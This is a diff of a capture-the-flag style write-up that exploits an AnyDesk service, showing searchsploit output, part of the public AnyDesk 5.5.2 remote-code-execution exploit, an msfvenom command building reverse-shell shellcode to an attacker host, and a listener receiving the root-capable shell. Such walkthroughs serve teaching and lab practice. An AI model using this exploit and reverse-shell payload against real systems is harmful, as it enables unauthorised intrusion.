@@ -31,22 +31,22 @@ Only 2 ports are open. Port 22 (ssh) and Port 7070 (running AnyDesk Client). We 
 
 ```bash
 kali@kali:searchsploit anydesk
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation                                                              | windows/local/40410.txt
-AnyDesk 5.4.0 - Unquoted Service Path                                                                                   | windows/local/47883.txt
-AnyDesk 5.5.2 - Remote Code Execution                                                                                   | linux/remote/49613.py
-AnyDesk 7.0.15 - Unquoted Service Path                                                                                  | windows/local/51968.txt
-AnyDesk 9.0.1 - Unquoted Service Path                                                                                   | windows/local/52258.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation                         | windows/local/40410.txt
+AnyDesk 5.4.0 - Unquoted Service Path                                              | windows/local/47883.txt
+AnyDesk 5.5.2 - Remote Code Execution                                              | linux/remote/49613.py
+AnyDesk 7.0.15 - Unquoted Service Path                                             | windows/local/51968.txt
+AnyDesk 9.0.1 - Unquoted Service Path                                              | windows/local/52258.txt
+----------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
 
 There are some exploits, but RCE sounds promising. Let's try that one.
 
 ```bash
-kali@kali:cat 49613.py 
+kali@kali:cat 49613.py
 # Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
 # Date: 09/06/20
 # Exploit Author: scryh
@@ -60,19 +60,19 @@ import struct
 import socket
 import sys
 
-ip = '192.168.x.x'                                                                                                                                
-port = 50001                                                                                                                                      
-                                                                                                                                                  
-def gen_discover_packet(ad_id, os, hn, user, inf, func):                                                                                          
-  d  = chr(0x3e)+chr(0xd1)+chr(0x1)                                                                                                               
-  d += struct.pack('>I', ad_id)                                                                                                                   
-  d += struct.pack('>I', 0)                                                                                                                       
-  d += chr(0x2)+chr(os)                                                                                                                           
-  d += struct.pack('>I', len(hn)) + hn                                                                                                            
-  d += struct.pack('>I', len(user)) + user                                                                                                        
-  d += struct.pack('>I', 0)                                                                                                                       
-  d += struct.pack('>I', len(inf)) + inf                                                                                                          
-  d += chr(0)                                                                                                                                     
+ip = '192.168.x.x'
+port = 50001
+
+def gen_discover_packet(ad_id, os, hn, user, inf, func):
+  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
+  d += struct.pack('>I', ad_id)
+  d += struct.pack('>I', 0)
+  d += chr(0x2)+chr(os)
+  d += struct.pack('>I', len(hn)) + hn
+  d += struct.pack('>I', len(user)) + user
+  d += struct.pack('>I', 0)
+  d += struct.pack('>I', len(inf)) + inf
+  d += chr(0)
   d += struct.pack('>I', len(func)) + func
   d += chr(0x2)+chr(0xc3)+chr(0x51)
   return d
@@ -99,11 +99,7 @@ s.close()
 print('reverse shell should connect within 5 seconds')
 ```
 
-So, 
-
-
-
-
+So, let's generate the shellcode with msfvenom.
 
 ```bash
 kali@kali:msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.130.26 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
@@ -158,7 +154,7 @@ kali@kali:penelope -p 4444
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/desktop~10.48.162.35-Linux-x86_64/2026_03_09-02_50_55-218.log 📜
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
 
